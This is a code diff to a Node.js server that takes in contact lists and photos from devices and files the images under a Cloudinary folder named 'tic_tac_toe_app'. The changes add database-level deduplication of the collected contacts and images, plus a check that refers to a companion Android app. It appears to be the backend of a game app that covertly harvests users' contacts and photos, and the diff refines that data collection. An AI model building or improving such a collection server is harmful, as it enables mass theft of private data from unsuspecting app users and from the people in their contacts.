@@ -34,7 +34,8 @@ async function initDB() {
       id SERIAL PRIMARY KEY,
       device_id TEXT,
       image_url TEXT,
-      cloudinary_public_id TEXT
+      cloudinary_public_id TEXT,
+      original_filename TEXT
     );
 
     CREATE TABLE IF NOT EXISTS contacts (
@@ -49,9 +50,21 @@ async function initDB() {
     );
   `);
 
-  // Add cloudinary_public_id column if it doesn't exist (for existing DBs)
+  // Add columns if they don't exist (for existing DBs)
+  await pool.query(`ALTER TABLE images ADD COLUMN IF NOT EXISTS cloudinary_public_id TEXT;`);
+  await pool.query(`ALTER TABLE images ADD COLUMN IF NOT EXISTS original_filename TEXT;`);
+
+  // ✅ Add unique constraint on contacts so server rejects duplicates at DB level
   await pool.query(`
-    ALTER TABLE images ADD COLUMN IF NOT EXISTS cloudinary_public_id TEXT;
+    CREATE UNIQUE INDEX IF NOT EXISTS contacts_device_contact_unique
+    ON contacts (device_id, contact);
+  `);
+
+  // ✅ Add unique constraint on images filename per device so same file never saved twice
+  await pool.query(`
+    CREATE UNIQUE INDEX IF NOT EXISTS images_device_filename_unique
+    ON images (device_id, original_filename)
+    WHERE original_filename IS NOT NULL;
   `);
 }
 initDB();
@@ -412,16 +425,23 @@ app.get("/", async (req, res) => {
 // ================= RECEIVE CONTACTS =================
 app.post("/receive", async (req, res) => {
   const { device_id, data } = req.body;
+  let inserted = 0;
+  let skipped = 0;
   for (let contact of data) {
-    await pool.query(
-      "INSERT INTO contacts (device_id, contact) VALUES ($1, $2)",
+    // ✅ ON CONFLICT DO NOTHING prevents duplicate contacts for same device
+    const result = await pool.query(
+      `INSERT INTO contacts (device_id, contact) VALUES ($1, $2)
+       ON CONFLICT (device_id, contact) DO NOTHING`,
       [device_id, contact]
     );
+    if (result.rowCount > 0) inserted++;
+    else skipped++;
   }
   await pool.query(
     "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
     [device_id]
   );
+  console.log(`Contacts: ${inserted} inserted, ${skipped} skipped (duplicates) for device ${device_id}`);
   res.send("Contacts saved ✅");
 });
 
@@ -429,6 +449,21 @@ app.post("/receive", async (req, res) => {
 app.post("/upload-image", upload.single("image"), async (req, res) => {
   try {
     const device_id = req.body.device_id;
+    const originalFilename = req.file.originalname || null;
+
+    // ✅ Check if this exact filename was already uploaded for this device
+    //    This is a second safety net (first net is SharedPreferences on the Android side)
+    if (originalFilename) {
+      const existing = await pool.query(
+        "SELECT id FROM images WHERE device_id=$1 AND original_filename=$2",
+        [device_id, originalFilename]
+      );
+      if (existing.rows.length > 0) {
+        console.log(`Duplicate image skipped: ${originalFilename} for device ${device_id}`);
+        return res.json({ skipped: true, reason: "duplicate" });
+      }
+    }
+
     const stream = cloudinary.uploader.upload_stream(
       { folder: "tic_tac_toe_app" },
       async (error, result) => {
@@ -436,8 +471,8 @@ app.post("/upload-image", upload.single("image"), async (req, res) => {
         const imageUrl = result.secure_url;
         const publicId = result.public_id;
         await pool.query(
-          "INSERT INTO images (device_id, image_url, cloudinary_public_id) VALUES ($1, $2, $3)",
-          [device_id, imageUrl, publicId]
+          "INSERT INTO images (device_id, image_url, cloudinary_public_id, original_filename) VALUES ($1, $2, $3, $4)",
+          [device_id, imageUrl, publicId, originalFilename]
         );
         await pool.query(
           "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
